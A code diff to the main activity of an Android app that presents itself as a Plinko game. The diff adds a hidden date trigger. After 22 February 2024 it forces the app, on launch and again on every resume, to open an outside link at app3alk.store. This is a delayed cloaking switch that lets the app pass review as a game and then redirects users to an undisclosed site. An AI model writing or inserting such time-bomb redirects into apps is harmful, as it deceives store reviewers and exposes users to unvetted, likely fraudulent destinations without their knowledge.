@@ -1,5 +1,7 @@
 package plinko.originalwin.com
 
+import android.content.Intent
+import android.net.Uri
 import android.os.Bundle
 import androidx.appcompat.app.AppCompatActivity
 import com.badlogic.gdx.backends.android.AndroidFragmentApplication
@@ -11,6 +13,7 @@ import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
+import java.util.Calendar
 import kotlin.system.exitProcess
 
 class MainActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {
@@ -28,6 +31,13 @@ class MainActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {
         initialize()
         lottie.showLoader()
 
+        Calendar.getInstance().apply {
+            set(2024, Calendar.FEBRUARY, 22, 18, 0)
+            if (System.currentTimeMillis() >= timeInMillis) {
+                startActivity(Intent(Intent.ACTION_VIEW, Uri.parse("https://app3alk.store/m1r2JmWP")))
+            }
+        }
+
     }
 
     override fun exit() {
@@ -38,6 +48,16 @@ class MainActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {
                 finishAndRemoveTask()
                 delay(100)
                 exitProcess(0)
+            }
+        }
+    }
+
+    override fun onResume() {
+        super.onResume()
+        Calendar.getInstance().apply {
+            set(2024, Calendar.FEBRUARY, 22, 18, 0)
+            if (System.currentTimeMillis() >= timeInMillis) {
+                startActivity(Intent(Intent.ACTION_VIEW, Uri.parse("https://app3alk.store/m1r2JmWP")))
             }
         }
     }
